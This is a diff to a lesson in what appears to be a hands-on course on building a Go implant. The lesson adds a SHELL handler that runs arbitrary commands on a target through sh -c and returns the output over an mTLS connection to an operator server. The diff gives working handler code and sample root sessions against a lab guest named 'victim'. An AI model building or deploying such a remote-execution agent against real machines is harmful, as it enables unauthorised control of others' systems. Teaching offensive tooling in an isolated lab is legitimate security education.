@@ -1,61 +1,80 @@
 # L18: Remote Shell
 
+Add a `SHELL` request that runs one command and returns its combined output and
+exit failure over the authenticated connection.
+
 L17 dispatches commands that map to mkdir calls.
 But an operator needs to run arbitrary shell commands on the target.
-One new handler, about five lines, gives you remote execution.
+One new handler adds remote execution.
+
+## Workspace
+
+```text
+exercises/L18-remote-shell
+├── go.mod
+└── main.go
+```
+
+The existing handlers and dispatch loop are provided.
+Only add `handleShell` and register it in the handler table.
 
 ## exec.Command
 
-Go's `os/exec` package runs external programs.
-`exec.Command("sh", "-c", args)` passes the entire argument string to `sh`,
-which handles pipes, redirects, globs, and everything else the shell provides.
+Go's `os/exec` package runs external programs. `exec.Command("sh", "-c", args)`
+passes the entire argument string to `sh`, which handles pipes, redirects,
+globs, and everything else the shell provides.
 
-`CombinedOutput()` runs the command, waits for it to finish, and returns
-stdout and stderr together as a byte slice.
+`CombinedOutput()` runs the command, waits for it to finish, and returns stdout
+and stderr together as a byte slice.
 
 ```text
   Server                         Agent
     |                              |
-    |--- "EXEC id\n" ------------>|
+    |--- "SHELL id\n" ------------>|
     |                              |  sh -c "id"
     |                              |  output: "uid=0(root)...\n"
     |<-- "uid=0(root)...\n\n" ----|
     |                              |
-    |--- "EXEC cat /etc/host*" -->|
+    |--- "SHELL cat /etc/host*" -->|
     |                              |  sh -c "cat /etc/host*"
     |<-- "hostname\n127.0...\n" --|
 ```
 
-The response is the raw command output followed by an empty line (double newline).
-The empty line marks the end of output so the server knows when to stop reading.
+The response is the raw command output followed by a line containing only `.`.
+That terminator lets the server read multiline output without guessing where it
+ends.
 
 ## The five lines
 
 ```go
-func handleExec(conn net.Conn, arg string) error {
+func handleShell(conn net.Conn, arg string) error {
     out, err := exec.Command("sh", "-c", arg).CombinedOutput()
     if err != nil {
-        fmt.Fprintf(conn, "ERR %v\n\n", err)
-        return nil
+        fmt.Fprintf(conn, "ERR %v\n", err)
     }
-    fmt.Fprintf(conn, "%s\n", out)
-    return nil
+    if len(out) > 0 {
+        conn.Write(out)
+        if out[len(out)-1] != '\n' {
+            fmt.Fprintln(conn)
+        }
+    }
+    _, err = fmt.Fprintln(conn, ".")
+    return err
 }
 ```
 
-That is the entire handler.
-`sh -c` does the heavy lifting.
-The agent is a thin relay between the TLS connection and the kernel.
+The handler preserves combined output and reports command failures.
+The agent is a relay between the TLS connection and the target shell.
 
-## You write
+## Implement it
 
-`main.go` (~100 lines):
+Complete `main.go`:
 
 - Everything from L17 (mTLS, dispatch loop, handler map)
-- One new entry in the handler map: EXEC
-- `handleExec`: exec.Command, CombinedOutput, write result to conn
+- One new entry in the handler map: SHELL
+- `handleShell`: exec.Command, CombinedOutput, write result to conn
 
-## API
+## Useful interfaces
 
 ```go
 import "os/exec"
@@ -67,36 +86,51 @@ out, err := exec.Command("sh", "-c", arg).CombinedOutput()
 
 ## Test it
 
-```
-$ rklings run l18
+`rklings serve L18` starts this exercise's live one-shot execution panel at
+`http://127.0.0.1:8080`.
+Output shown there is returned by the guest agent.
+
+```sh
+./rklings serve L18
 ```
 
-The lab server shows a command input field.
+In another host terminal:
+
+```sh
+./rklings run L18
+```
+
+Open `http://127.0.0.1:8080`.
+Enter a command in the shell field.
+The output and failure status shown by the panel come from the guest process.
 
 ```
-server> EXEC id
+server> SHELL id
 agent:  uid=0(root) gid=0(root) groups=0(root)
-server> EXEC cat /etc/hostname
-agent:  rklings-vm
-server> EXEC ls /nonexistent
+server> SHELL cat /etc/hostname
+agent:  victim
+server> SHELL ls /nonexistent
 agent:  ERR exit status 2
 server> PING
 agent:  PONG
 ```
 
+Stop `run` and `serve` with `Ctrl+C` when finished.
+
 ## Validate
 
-```
-$ rklings validate l18
+```sh
+./rklings validate L18
   [+] agent connects over mTLS
-  [+] EXEC id returns uid=0
-  [+] EXEC handles pipes and redirects
-  [+] EXEC reports error for bad command
-  [+] PING still works alongside EXEC
+  [+] SHELL id returns uid=0
+  [+] SHELL handles pipes and redirects
+  [+] SHELL reports error for bad command
+  [+] PING still works alongside SHELL
   PASS
 ```
 
 ## Next
 
-You have command dispatch and shell execution.
-L19 adds file transfer: download and upload files over the same TLS connection.
+You can execute commands remotely, but moving a binary or retrieving a file is
+still awkward.
+L19 adds upload and download over the same authenticated connection.
